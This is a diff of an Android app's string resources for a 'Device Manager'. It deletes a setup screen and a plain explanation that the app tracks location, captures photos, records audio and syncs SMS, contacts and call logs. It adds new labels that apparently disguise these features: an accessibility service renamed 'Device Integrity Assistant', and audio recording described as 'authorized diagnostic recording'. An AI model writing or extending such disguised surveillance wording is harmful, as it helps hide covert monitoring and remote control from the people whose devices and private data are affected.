@@ -1,37 +1,12 @@
-<?xml version="1.0" encoding="utf-8"?>
 <resources>
     <string name="app_name">Device Manager</string>
-    <string name="notification_listener_label">Device Manager Notification Listener</string>
-    <string name="remote_input_label">Device Manager Remote Control</string>
-    <string name="remote_input_description">Allows the dashboard to remotely control this device via touch gestures when remote control mode is explicitly enabled. Requires user consent in Accessibility settings.</string>
-
-    <!-- Setup -->
-    <string name="setup_title">Device Setup</string>
-    <string name="setup_subtitle">Configure your server connection and pair this device</string>
-    <string name="server_url_label">Server URL</string>
-    <string name="server_url_hint">http://your-server:3000</string>
-    <string name="device_token_label">Device Token</string>
-    <string name="copy_token">Copy Token</string>
-    <string name="pair_device">Pair Device</string>
-    <string name="continue_setup">Continue</string>
-    <string name="permissions_explanation_title">Required Permissions</string>
-    <string name="permissions_explanation">This app requires several permissions to monitor and manage your device. All permissions are optional and can be granted or revoked at any time. The app will clearly indicate when a permission is missing and will never attempt to bypass Android security.\n\nKey permissions:\n• Location — for GPS tracking\n• Camera — for remote photo capture\n• Microphone — for screen recording audio\n• Notifications — for monitoring notifications\n• Contacts/Call Log/SMS — for syncing personal data\n• Usage Access — for app usage statistics\n• Screen Capture — for screen recording (requires user consent each time)</string>
-
-    <!-- Main -->
-    <string name="status_title">Device Status</string>
-    <string name="connection_status">Connection</string>
-    <string name="battery_level">Battery</string>
-    <string name="charging_status">Charging</string>
-    <string name="network_type">Network</string>
-    <string name="sync_now">Sync Now</string>
-    <string name="check_permissions">Permissions</string>
-    <string name="recent_commands">Recent Commands</string>
-
-    <!-- Permissions -->
-    <string name="permissions_title">Permission Status</string>
-    <string name="grant">Grant</string>
-
-    <!-- Common -->
-    <string name="online">Online</string>
-    <string name="offline">Offline</string>
+    <string name="service_notification_channel_name">Device Management Service</string>
+    <string name="service_notification_channel_desc">Active background synchronization and real-time command processing</string>
+    <string name="service_notification_title">Device Management Active</string>
+    <string name="service_notification_text">Connected and synchronizing with management server</string>
+    <string name="recording_notification_title">Audio Recording in Progress</string>
+    <string name="recording_notification_text">Authorized diagnostic recording requested by administrator</string>
+    <string name="accessibility_service_label">Device Integrity Assistant</string>
+    <string name="accessibility_service_description">Analyzes system window transitions and page accessibility to optimize device integrity, diagnostic verification, and app compliance auditing as configured by the device owner.</string>
+    <string name="notification_listener_label">Notification Monitor Service</string>
 </resources>
